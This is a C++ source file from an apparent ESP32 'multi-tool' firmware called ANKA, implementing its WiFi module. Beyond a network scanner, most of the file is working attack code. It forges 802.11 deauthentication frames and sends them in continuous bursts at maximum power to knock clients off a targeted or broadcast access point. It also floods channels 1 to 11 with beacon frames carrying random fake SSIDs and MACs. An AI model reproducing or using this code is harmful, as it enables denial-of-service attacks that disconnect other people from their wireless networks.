/**
 * ANKA - ESP32 Multi-Tool Firmware
 * WiFi Module Implementation
 * NOTE: IEEE80211 bypass is now in wifi_bypass.c (separate C file)
 */

#include "wifi_module.h"
#include "../display/display.h"
#include "../input/buttons.h"

WiFiModule wifiModule;

// Marauder-style deauthentication frame (exact copy)
const uint8_t WiFiModule::deauthFrame[] = {
    0xc0, 0x00,                         // Frame Control: Type/Subtype Deauth
    0x3a, 0x01,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: AP MAC (filled dynamically)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: AP MAC (filled dynamically)
    0xf0, 0xff,                         // Sequence Control
    0x02, 0x00 // Reason Code: 2 (Previous auth invalid)
};

// Beacon frame template
const uint8_t WiFiModule::beaconFrame[] = {
    0x80,
    0x00, // Frame Control (Beacon)
    0x00,
    0x00, // Duration
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF,
    0xFF, // Destination (broadcast)
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // Source (to be filled)
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00, // BSSID (to be filled)
    0x00,
    0x00, // Sequence number
    // Timestamp (8 bytes)
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x00,
    0x64,
    0x00, // Beacon interval (100 TU)
    0x31,
    0x04, // Capability info
};

WiFiModule::WiFiModule() {
  networkCount = 0;
  deauthRunning = false;
  beaconSpamRunning = false;
  deauthPacketsSent = 0;
  deauthTaskHandle = nullptr;
  beaconTaskHandle = nullptr;
}

void WiFiModule::init() {
  // 1. WiFi Mode AP
  WiFi.mode(WIFI_AP);

  // 2. Hidden AP "setup" (Marauder standard)
  WiFi.softAP("setup", nullptr, 1, 1, 0);
  delay(100);

  // 3. Max Power
  esp_wifi_set_max_tx_power(84);

  Serial.println("[WiFi] Initialized (Marauder Style)");
}

void WiFiModule::deinit() {
  stopDeauth();
  stopBeaconSpam();
  WiFi.mode(WIFI_OFF);
}

int WiFiModule::scanNetworks() {
  display.drawProgress("WiFi Scan", "Scanning...", 0);

  clearNetworks();

  int found = WiFi.scanNetworks(false, true);

  for (int i = 0; i < found && i < MAX_SCAN_RESULTS; i++) {
    networks[i].ssid = WiFi.SSID(i);
    memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
    networks[i].rssi = WiFi.RSSI(i);
    networks[i].channel = WiFi.channel(i);
    networks[i].encryption = WiFi.encryptionType(i);
    networks[i].selected = false;
    networkCount++;

    int progress = ((i + 1) * 100) / found;
    display.drawProgress("WiFi Scan", "Scanning...", progress);
  }

  WiFi.scanDelete();

  Serial.printf("[WiFi] Found %d networks\n", networkCount);
  return networkCount;
}

AccessPoint *WiFiModule::getNetwork(int index) {
  if (index >= 0 && index < networkCount) {
    return &networks[index];
  }
  return nullptr;
}

int WiFiModule::getNetworkCount() { return networkCount; }

void WiFiModule::clearNetworks() {
  networkCount = 0;
  for (int i = 0; i < MAX_SCAN_RESULTS; i++) {
    networks[i].ssid = "";
    networks[i].selected = false;
  }
}

void WiFiModule::sendDeauthPacket(uint8_t *target, uint8_t *source,
                                  uint8_t channel) {
  // Use Marauder-style deauth frame (26 bytes)
  uint8_t packet[26] = {
      0xC0, 0x00, 0x3A, 0x01,             // Frame Control, Duration
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
      0xF0, 0xFF, 0x02, 0x00              // Reason code
  };

  // Set destination
  memcpy(&packet[4], target, 6);

  // Set source and BSSID
  memcpy(&packet[10], source, 6);
  memcpy(&packet[16], source, 6);

  // Set channel
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(1); // Marauder uses delay(1) after channel change

  // Send packet 3 times using WIFI_IF_AP (critical fix from Marauder)
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);

  deauthPacketsSent += 3;
}

void WiFiModule::deauthTask(void *param) {
  WiFiModule *self = (WiFiModule *)param;

  Serial.println("[WiFi] Deauth task starting...");

  // DON'T change WiFi mode - already in AP mode from init()
  esp_wifi_set_max_tx_power(84);

  uint8_t broadcastMac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  int packetCount = 0;

  Serial.printf("[WiFi] Deauth running on channel %d\n", self->deauthChannel);

  while (self->deauthRunning) {
    // Send 100 packet burst for better effectiveness
    for (int i = 0; i < 100; i++) {
      // Send deauth: AP -> broadcast
      self->sendDeauthPacket(broadcastMac, self->deauthTarget,
                             self->deauthChannel);

      // Send deauth: broadcast -> AP (reverse)
      self->sendDeauthPacket(self->deauthTarget, broadcastMac,
                             self->deauthChannel);

      packetCount += 6; // Each sendDeauthPacket sends 3

      if (i % 20 == 0)
        yield(); // Yield every 20 packets
    }

    // Log every burst
    Serial.printf("[WiFi] Sent %d total deauth packets\n", packetCount);

    vTaskDelay(pdMS_TO_TICKS(5)); // Short delay between bursts
  }

  Serial.println("[WiFi] Deauth task ended");
  vTaskDelete(NULL);
}

void WiFiModule::startDeauth(uint8_t *targetBssid, uint8_t channel) {
  if (deauthRunning)
    return;

  memcpy(deauthTarget, targetBssid, 6);
  deauthChannel = channel;
  deauthPacketsSent = 0;
  deauthRunning = true;

  // Larger stack for stability
  xTaskCreatePinnedToCore(deauthTask, "deauth", 16384, this, 1,
                          &deauthTaskHandle, 0);

  Serial.println("[WiFi] Deauth started");
}

void WiFiModule::startDeauthBroadcast(uint8_t channel) {
  uint8_t broadcastBssid[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  startDeauth(broadcastBssid, channel);
}

void WiFiModule::stopDeauth() {
  if (!deauthRunning)
    return;

  deauthRunning = false;

  if (deauthTaskHandle) {
    vTaskDelay(pdMS_TO_TICKS(100));
    deauthTaskHandle = nullptr;
  }

  Serial.printf("[WiFi] Deauth stopped. Sent %d packets\n", deauthPacketsSent);
}

bool WiFiModule::isDeauthRunning() { return deauthRunning; }

int WiFiModule::getDeauthPacketsSent() { return deauthPacketsSent; }

void WiFiModule::sendBeaconPacket(const char *ssid, uint8_t *mac,
                                  uint8_t channel) {
  int ssidLen = strlen(ssid);
  if (ssidLen > 32)
    ssidLen = 32;

  // Use static buffer to prevent heap fragmentation (CRITICAL FIX)
  uint8_t packet[128];
  int packetSize = sizeof(beaconFrame) + 2 + ssidLen + 8;

  if (packetSize > sizeof(packet)) {
    return; // Safety check
  }

  memcpy(packet, beaconFrame, sizeof(beaconFrame));

  // Set source and BSSID
  memcpy(&packet[10], mac, 6);
  memcpy(&packet[16], mac, 6);

  int offset = sizeof(beaconFrame);

  // SSID parameter
  packet[offset++] = 0x00;    // SSID tag
  packet[offset++] = ssidLen; // SSID length
  memcpy(&packet[offset], ssid, ssidLen);
  offset += ssidLen;

  // Supported rates
  packet[offset++] = 0x01; // Supported rates tag
  packet[offset++] = 0x08; // Length
  packet[offset++] = 0x82; // 1 Mbps
  packet[offset++] = 0x84; // 2 Mbps
  packet[offset++] = 0x8B; // 5.5 Mbps
  packet[offset++] = 0x96; // 11 Mbps
  packet[offset++] = 0x24; // 18 Mbps
  packet[offset++] = 0x30; // 24 Mbps
  packet[offset++] = 0x48; // 36 Mbps
  packet[offset++] = 0x6C; // 54 Mbps

  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, offset, false);

  // No delete needed for static buffer
}

void WiFiModule::generateRandomMac(uint8_t *mac) {
  for (int i = 0; i < 6; i++) {
    mac[i] = random(256);
  }
  mac[0] = (mac[0] & 0xFE) | 0x02; // Set locally administered bit
}

void WiFiModule::generateRandomSSID(char *ssid, int maxLen) {
  const char *charset =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  int len = random(6, maxLen);

  for (int i = 0; i < len; i++) {
    ssid[i] = charset[random(62)];
  }
  ssid[len] = '\0';
}

void WiFiModule::beaconTask(void *param) {
  WiFiModule *self = (WiFiModule *)param;

  Serial.println("[WiFi] Beacon task starting...");

  // Setup basics
  esp_wifi_set_max_tx_power(84);

  uint8_t mac[6];
  char ssid[33];
  int beaconCount = 0;

  Serial.println("[WiFi] Beacon spam running...");

  while (self->beaconSpamRunning) {
    // Send 10 beacons then change channel
    for (int ch = 1; ch <= 11 && self->beaconSpamRunning; ch++) {
      // Send multiple beacons per channel to reduce switching overhead
      for (int k = 0; k < 5; k++) {
        self->generateRandomMac(mac);
        self->generateRandomSSID(ssid, 12);
        self->sendBeaconPacket(ssid, mac, ch);
        beaconCount++;

        // Critical: Yield frequently to prevent WDT reset
        yield();
      }

      // Delay after channel burst to let system breathe
      vTaskDelay(pdMS_TO_TICKS(10));
    }

    // Longer delay between full sweeps
    vTaskDelay(pdMS_TO_TICKS(20));

    if (beaconCount % 100 == 0) {
      Serial.printf("[WiFi] Sent %d beacons\n", beaconCount);
    }
  }

  Serial.println("[WiFi] Beacon task ended");
  vTaskDelete(NULL);
}

void WiFiModule::startBeaconSpam(const char **ssids, int count) {
  // Custom SSIDs beacon spam - simplified to random for now
  startRandomBeaconSpam(count);
}

void WiFiModule::startRandomBeaconSpam(int count) {
  if (beaconSpamRunning)
    return;

  beaconSpamRunning = true;

  // INCREASED COMMAND: Stack 16384 for stability
  xTaskCreatePinnedToCore(beaconTask, "beacon", 16384, this, 1,
                          &beaconTaskHandle, 0);

  Serial.println("[WiFi] Beacon spam started");
}

void WiFiModule::stopBeaconSpam() {
  if (!beaconSpamRunning)
    return;

  beaconSpamRunning = false;

  if (beaconTaskHandle) {
    vTaskDelay(pdMS_TO_TICKS(200));
    beaconTaskHandle = nullptr;
  }

  Serial.println("[WiFi] Beacon spam stopped");
}

bool WiFiModule::isBeaconSpamRunning() { return beaconSpamRunning; }

String WiFiModule::macToString(uint8_t *mac) {
  char buf[18];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1],
           mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

void WiFiModule::stringToMac(const char *str, uint8_t *mac) {
  sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2],
         &mac[3], &mac[4], &mac[5]);
}

String WiFiModule::getEncryptionType(uint8_t type) {
  switch (type) {
  case WIFI_AUTH_OPEN:
    return "OPEN";
  case WIFI_AUTH_WEP:
    return "WEP";
  case WIFI_AUTH_WPA_PSK:
    return "WPA";
  case WIFI_AUTH_WPA2_PSK:
    return "WPA2";
  case WIFI_AUTH_WPA_WPA2_PSK:
    return "WPA/2";
  case WIFI_AUTH_WPA2_ENTERPRISE:
    return "WPA2-E";
  case WIFI_AUTH_WPA3_PSK:
    return "WPA3";
  default:
    return "?";
  }
}
